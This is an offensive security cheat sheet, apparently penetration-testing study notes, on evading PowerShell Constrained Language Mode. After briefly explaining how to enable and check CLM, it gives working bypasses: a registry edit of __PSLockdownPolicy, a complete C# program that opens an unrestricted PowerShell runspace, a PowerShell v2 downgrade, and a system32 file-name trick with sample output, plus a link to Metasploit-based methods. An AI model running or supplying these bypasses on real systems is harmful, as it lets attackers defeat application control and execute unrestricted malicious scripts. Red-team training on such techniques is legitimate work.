# CLM

<details>

<summary>What is it? + How to enable?</summary>

* Constrained Language Mode is a PowerShell security restriction enforced by Windows Defender Application Control (WDAC) or Device Guard.&#x20;
* It limits access to certain commands and features, reducing the risk of malicious script execution.

- Run the following command on admin powershell.exe:

```powershell
$ExecutionContext.SessionState.LanguageMode = "ConstrainedLanguage"
```

</details>

<details>

<summary>Checking CLM</summary>

```powershell
$ExecutionContext.SessionState.LanguageMode
```

* `FullLanguage` → **No restrictions** (default for admin users).
* `RestrictedLanguage` → **Highly restricted**, only allows basic expressions.
* `ConstrainedLanguage` → **Blocks .NET, COM objects, and Reflection**, while allowing most built-in cmdlets.

</details>

<details>

<summary>[Privileged] CLM Bypass By Removal of the Associated Registry Key</summary>

```powershell
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment\" -name __PSLockdownPolicy -Value 8
```

</details>

<details>

<summary>[Unprivileged] CLM Bypass Using PSByPassCLM</summary>

* Emulate an interactive PowerShell console in a runspace unaffected by language mode
* Need to add reference
  * ```powershell
    C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\v4.0_3.0.0.0__31bf3856ad364e35\System.Management.Automation.dll
    ```
  * ![](<../.gitbook/assets/image (10) (1).png>)

```csharp
using System;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Collections.ObjectModel;
using System.Text;

namespace PowerShellConstrainedLanguageBypass {
    public class Program {
        public static void Main(string[] args) {
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();

            RunspaceInvoke runSpaceInvoker = new RunspaceInvoke(runspace);
            runSpaceInvoker.Invoke("Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process");

            string cmd = "";
            do {
                Console.Write("PS > ");
                cmd = Console.ReadLine();

                if (!string.IsNullOrEmpty(cmd)) {

                    using (Pipeline pipeline = runspace.CreatePipeline()) {

                        try {
                            pipeline.Commands.AddScript(cmd);
                            pipeline.Commands.Add("Out-String");

                            Collection<PSObject> results = pipeline.Invoke();
                            StringBuilder stringBuilder = new StringBuilder();

                            foreach (PSObject obj in results) {
                                stringBuilder.AppendLine(obj.ToString());
                            }

                            Console.Write(stringBuilder.ToString());
                        }

                        catch (Exception ex) {
                            Console.WriteLine("{0}", ex.Message);
                        }
                    }
                }
            } while (cmd != "exit");
        }
    }
}
```

</details>

<details>

<summary>[Unprivileged] CLM Bypass Using Powershell Downgrade</summary>

```bash
powershell.exe -version 2
```

* Powershell v2 is disabled by default on Win10/11 OS

</details>

<details>

<summary>[Unprivileged] CLM Bypass Using System32</summary>

* From [https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass#system32-bypass](https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass#system32-bypass)
* Path from where your script is being executed needs to contain the string `system32`

```
PS>cat .\test.ps1
$ExecutionContext.SessionState.LanguageMode

PS>.\test.ps1; mv .\test.ps1 system32.ps1; .\system32.ps1
ConstrainedLanguage
FullLanguage
```



</details>

<details>

<summary>Bypass CLM (Metasploit)</summary>

[https://github.com/beauknowstech/OSEP-Everything/tree/main/CLM%20bypass](https://github.com/beauknowstech/OSEP-Everything/tree/main/CLM%20bypass)

</details>
